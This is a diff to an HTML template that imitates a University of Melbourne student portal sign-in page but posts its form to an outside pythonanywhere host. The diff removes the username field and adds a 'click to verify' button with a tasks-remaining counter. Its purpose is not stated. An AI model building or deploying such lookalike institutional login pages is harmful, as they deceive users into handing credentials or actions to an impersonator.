@@ -7,8 +7,9 @@
     </head>
     <body>
         <p style="text-align:center">Sign in with your University of Melbourne account to access Student Portal</p>
-        
-        <div id="nope-login-container"  style="margin-left:{{ leftmost }}px">
+        <p style="text-align:center">Please click the button below to continue to verification</p>
+
+        <div id="nope-login-container"  style="margin-left:{{ leftmost }}px;margin-top:{{ downmost }}px">
             <main data-se="auth-container" tabindex="-1" id="nope-sign-in" class="auth-container main-container no-beacon" style="">
 
                 <div class="nope-sign-in-header auth-header" >
@@ -21,31 +22,28 @@
 
                         <div class="siw-main-body" >
                             <form method="POST" action="https://mol868.pythonanywhere.com/login/{{ remaining }}" data-se="o-form" slot="content" id="form20" class="ion-form o-form o-form-edit-mode">
-                                <div data-se="o-form-content" class="o-form-content o-form-theme clearfix" >
-                                    <h2 data-se="o-form-head" class="nope-form-title o-form-head">You have {{ remaining }} verification tasks remaining</h2>
+                                <h2 data-se="o-form-head" class="nope-form-title o-form-head">You have {{ remaining }} verification tasks remaining</h2>
 
+                                <div data-se="o-form-content" class="o-form-content o-form-theme clearfix" >
                                     <h2 data-se="o-form-head" class="nope-form-title o-form-head">Log in</h2>
                                     <div class="o-form-info-container" ></div>
                                     <div class="o-form-error-container" data-se="o-form-error-container" role="alert" ></div>
                                     <div class="o-form-fieldset-container" data-se="o-form-fieldset-container" >
                                         <div data-se="o-form-fieldset-identifier" class="o-form-fieldset o-form-label-top" >
                                             <div data-se="o-form-label" class="nope-form-label o-form-label" >
-                                                <label for="input28">Username</label>
+                                                <label for="input28">click the button</label>
                                             </div>
+                                            
                                             <div data-se="o-form-input-container" class="o-form-input" >
-                                                <p class="o-form-explain" id="describe-username">e.g. jsmith (not email address)</p>
-                                                <span data-se="o-form-input-identifier" class="o-form-input-name-identifier o-form-control nope-form-input-field input-fix">
-                                                    <input type="text" placeholder="" name="nm" value="NAME" autocomplete="username" required="">
-                                                    <input type="hidden" name="count" id="foo" value= "{{ leftmost }}">
-                                                    <input type="hidden" name="remaining" id="foo" value= "{{ remaining }}">
-
-                                                </span>
+                                                <p class="o-form-explain" id="describe-username">to continue verification</p>
                                             </div>
                                         </div>
                                     </div>
                                 </div>
                                 <div class="o-form-button-bar" >
-                                    <input class="button button-primary" type="submit" value="NEXT" data-type="save">
+                                    <input class="button button-primary" type="submit" value="CLICK TO VERIFY" data-type="save">
+                                    <input type="hidden" name="remaining" id="foo" value= "{{ remaining }}">
+
                                 </div>
                             </form>
                             <div class="siw-main-footer" >
